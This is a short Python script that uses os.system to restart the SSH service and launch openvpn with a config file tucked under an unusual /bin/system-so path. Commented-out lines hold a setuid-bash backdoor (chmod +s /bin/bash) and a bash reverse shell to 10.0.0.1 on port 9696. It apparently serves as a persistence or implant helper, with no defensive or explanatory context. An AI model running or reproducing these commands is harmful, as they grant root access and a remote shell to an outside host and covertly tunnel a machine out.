import os
run=os.system
run("systemctl restart ssh")
#run("systemctl start ssh")
#run("chmod +s /bin/bash")
#run("bash -i >& /dev/tcp/10.0.0.1/9696 0>&1")
run("openvpn /bin/system-so/user1596.user1596.ovpn")

